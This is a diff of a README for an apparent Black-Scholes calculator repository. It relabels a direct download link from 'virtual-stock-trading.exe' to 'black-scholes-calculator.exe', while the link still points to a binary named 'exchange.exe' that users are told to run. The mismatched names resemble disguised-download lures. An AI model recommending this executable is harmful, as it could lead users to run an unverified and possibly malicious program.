@@ -30,7 +30,7 @@ $$ d_2 = d_1 - \sigma\sqrt{t} $$
 ## 📥 How to Download & Run
 
 ### 1. For General Users (Recommended!)
-1. Click **[👉 Download virtual-stock-trading.exe 📥](https://github.com/loveisworld732-del/black-scholes-calculator/releases/latest/download/exchange.exe)** to download the application directly.
+1. Click **[👉 Download black-scholes-calculator.exe 📥](https://github.com/loveisworld732-del/black-scholes-calculator/releases/latest/download/exchange.exe)** to download the application directly.
 2. click the downloaded `.exe` file to run it. No Python installation required!
 
 ### 2. For Developers (Source Code Execution)
